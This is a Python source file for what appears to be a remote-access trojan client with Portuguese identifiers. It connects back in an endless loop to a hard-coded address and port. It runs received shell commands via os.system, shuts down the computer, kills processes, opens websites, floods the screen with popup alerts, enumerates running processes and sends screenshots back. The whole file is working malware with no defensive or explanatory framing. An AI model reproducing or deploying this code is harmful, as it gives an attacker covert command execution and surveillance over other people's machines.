import socket as ss
from threading import Thread
import os
from pyautogui import alert, screenshot
import psutil as ps
import webbrowser
import io


class Idd:
    def __init__(self):
        while True:
            try:
                with ss.socket(ss.AF_INET, ss.SOCK_STREAM) as self.idle:
                    self.idle.connect(("192.168.15.71", 53361))
                    self.receber()
            except ss.error:
                self.idle.close()
                continue

            except Exception:
                self.idle.send(bytes('err', 'utf-8'))
                continue


    def receber(self):
        while True:
            go = True
            while go:
                ulti = self.idle.recv(1024)
                if ulti:
                    msg = ulti.decode("utf-8")
                    go = False

            if "\n" in msg:
                pato = msg.split("\n")

                if "kill" in pato:
                    self.fechar(pato[1])
                    continue

                if "popup" in pato:
                    Thread(target=self.pop, args=(pato[1],)).start()
                    continue

                if "expecifico" in pato:
                    Thread(target=self.expec, args=(pato[1],)).start()
                    continue

                if "site" in pato:
                    Thread(target=self.site, args=(pato[1],)).start()
                    continue

            else:
                if msg == "desligar":
                    self.desligar()
                    continue

                if msg == "RP":
                    self.process()
                    continue

                if msg == "PrintS":
                    Thread(target=self.printt).start()


    def site(self,sitee):
        webbrowser.open(sitee)
        self.idle.send(bytes("Site aberto", "utf-8"))
        self.receber()


    def expec(self,comand):
        os.system(comand)
        self.idle.send(bytes(f"{comand} est√° sendo executado", "utf-8"))
        self.receber()


    def desligar(self):
        os.system("shutdown -s -t 0")
        self.idle.send(bytes("Desligando", "utf-8"))
        self.receber()


    def fechar(self, processo):
        os.system(f"TASKKILL /IM {processo}")
        self.idle.send(bytes(f"{processo} Fechado", "utf-8"))
        self.receber()


    def pop(self, pop):
        while True:
            alert(pop)


    def process(self):
        processos = list()
        for proc in ps.process_iter():
            if not proc.name() in processos:
                processos.append(proc.name())
        print(processos)
        self.idle.send(bytes(f"{processos}", "utf-8"))
        self.receber()


    def printt(self):
        foto = screenshot()
        imgByteArr = io.BytesIO()
        foto.save(imgByteArr, format=foto.format)
        self.idle.send(imgByteArr.getvalue())

Idd()